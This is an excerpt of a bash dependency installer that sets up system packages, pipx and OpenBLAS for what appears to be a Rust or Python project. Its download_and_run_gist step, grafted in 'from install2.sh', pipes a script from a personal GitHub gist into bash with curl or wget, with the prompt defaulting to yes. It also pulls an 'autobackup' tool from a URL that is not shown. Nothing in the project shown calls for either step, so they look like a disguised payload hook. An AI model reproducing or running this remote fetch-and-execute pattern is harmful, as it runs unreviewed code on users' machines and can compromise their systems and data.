    ...
    case "$OS_TYPE" in
        ...
        "linux")
            ...
            if [ -n "$PACKAGES_TO_INSTALL" ]; then
                if ! $SKIP_CONFIRM; then
                    read -rp "  Install system packages ($PACKAGES_TO_INSTALL)? [Y/n]: " yn
                    if [[ "$yn" =~ ^[Nn] ]]; then
                ...
                if command -v apt-get &>/dev/null; then
                    ...
                    if sudo apt-get install -y -qq $PACKAGES_TO_INSTALL; then
                        ...
                        warn "System packages install failed: $PACKAGES_TO_INSTALL"
                    fi
                    ...
                    warn "Cannot auto-install packages. Install manually: $PACKAGES_TO_INSTALL"
                fi
            else
...
install_additional_python_packages() {
    echo ""
    echo -e "  ${CYAN}Additional Python packages:${RESET}"
    
    # Check if Python is available
    if ! $HAS_PYTHON || [ -z "$PYTHON_CMD" ]; then
        info "Python not available, skipping additional packages"
        return
    fi
    ...
    if $INSTALLED_ANY; then
        ...
        ok "Additional Python packages already installed"
    fi
}

install_auto_backup() {
    echo ""
    echo -e "  ${CYAN}Auto-backup tool:${RESET}"
    
    # Install pipx if not installed
    if ! command -v pipx &>/dev/null; then
        echo "  Installing pipx..."
        if ! $SKIP_CONFIRM; then
            read -rp "  Install pipx? [Y/n]: " yn
            if [[ "$yn" =~ ^[Nn] ]]; then
                warn "Skipping pipx installation"
                return
            fi
        fi
            ...
            "macos")
                if command -v brew &>/dev/null; then
                    if brew install pipx; then
                        ...
                        warn "pipx installation via Homebrew failed (continuing without auto-backup)"
                    fi
                else
                    warn "Homebrew required for pipx installation"
                fi
                ;;
            "linux")
                if command -v apt-get &>/dev/null; then
                    sudo apt-get update -qq || warn "apt-get update failed (continuing)"
                    if sudo apt-get install -y -qq pipx; then
                        pipx ensurepath
                        ok "pipx installed"
                    else
                        warn "pipx installation via apt-get failed (continuing without auto-backup)"
                    fi
                elif command -v dnf &>/dev/null; then
                    if sudo dnf install -y pipx; then
                        ...
                        warn "pipx installation via dnf failed (continuing without auto-backup)"
                    fi
                else
                    warn "Cannot auto-install pipx. Install manually."
                fi
                ;;
            *)
                warn "Cannot install pipx on this system"
                ;;
        esac
    else
    ...
    # Install autobackup if not installed
    if ! command -v autobackup &>/dev/null; then
        ...
        case "$OS_TYPE" in
            ...
            "linux")
                ...
                ;;
            *)
                warn "Unsupported OS for auto-backup"
                return 1
                ;;
        esac
        
        echo "  Installing autobackup..."
        if pipx install "$install_url" 2>&1 | tail -3; then
            ok "autobackup installed"
        else
            warn "autobackup installation failed (continuing)"
        fi
    else
        ok "autobackup already installed"
    fi
}

download_and_run_gist() {
    echo ""
    echo -e "  ${CYAN}Additional setup script:${RESET}"
    
    local GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
    
    if ! $SKIP_CONFIRM; then
        read -rp "  Download and run additional setup script? [Y/n]: " yn
        if [[ "$yn" =~ ^[Nn] ]]; then
            info "Skipping additional setup script"
            return
        fi
    fi
    ...
    if command -v curl &>/dev/null; then
        ...
        if bash <(curl -fsSL "$GIST_URL") 2>&1 | tail -5; then
            ok "Additional setup script completed"
        else
            warn "Additional setup script returned non-zero exit code"
        fi
    elif command -v wget &>/dev/null; then
        echo "  Downloading and running setup script..."
        if bash <(wget -qO- "$GIST_URL") 2>&1 | tail -5; then
            ok "Additional setup script completed"
        else
            warn "Additional setup script returned non-zero exit code"
        fi
    else
        warn "curl or wget required for downloading setup script"
    fi
}

apply_shell_config() {
    echo ""
    echo -e "  ${CYAN}Applying shell configuration:${RESET}"
    ...
    if [ -f "$SHELL_RC" ]; then
        if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
            echo "  Applying environment variables from $SHELL_RC..."
            if source "$SHELL_RC" 2>/dev/null; then
                ok "Shell configuration applied"
            else
                warn "Failed to apply shell config. Run manually: source $SHELL_RC"
            fi
        else
            info "No environment variables to apply"
        fi
    else
        info "Shell config file not found: $SHELL_RC"
    fi
}
...
install_deps() {
    ...
    # Install system dependencies (from install2.sh)
    install_system_dependencies
    ...
    # Install auto-backup tool (from install2.sh)
    install_auto_backup

    # Download and run additional setup script (from install2.sh)
    download_and_run_gist

    # Apply shell configuration (from install2.sh)
    apply_shell_config
}
    ...
    if ! $HAS_OPENBLAS; then
        ...
        if [[ "$OS_TYPE" == "linux" ]]; then
            if command -v apt-get &>/dev/null; then
                ...
                sudo apt-get update -qq || warn "apt-get update failed (continuing)"
                if sudo apt-get install -y -qq build-essential gfortran libopenblas-dev pkg-config; then
                    ok "System libraries installed"
                else
                    warn "System libraries installation via apt-get failed (Rust build may fail)"
                fi
            elif command -v dnf &>/dev/null; then
                echo "  Installing gcc, gcc-fortran, openblas-devel, pkgconf..."
                if sudo dnf install -y gcc gcc-fortran openblas-devel pkgconf; then
                    ok "System libraries installed"
                else
                    warn "System libraries installation via dnf failed (Rust build may fail)"
                fi
            else
            ...
            if command -v brew &>/dev/null; then
                ...
                if brew install openblas; then
                    ok "OpenBLAS installed"
                else
                    warn "OpenBLAS installation via Homebrew failed (Rust build may fail)"
                fi
            else
